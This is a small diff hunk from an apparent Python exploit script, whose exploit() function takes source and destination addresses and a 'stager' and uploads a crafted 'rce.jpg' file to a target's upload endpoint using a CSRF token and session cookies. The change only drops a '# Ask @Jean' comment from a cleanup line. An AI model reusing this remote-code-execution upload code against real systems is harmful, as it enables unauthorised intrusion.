@@ -31,4 +31,4 @@ def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: st
     files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
     session.post(url=upload_file_url, files=files, headers={"X-CSRF-Token": token, "Referer": upload_file_url, "Accept": "application/json"}, cookies=cookies)
 
-    os.system("rm rce.jpg && rm rce.txt") # Ask @Jean
+    os.system("rm rce.jpg && rm rce.txt")
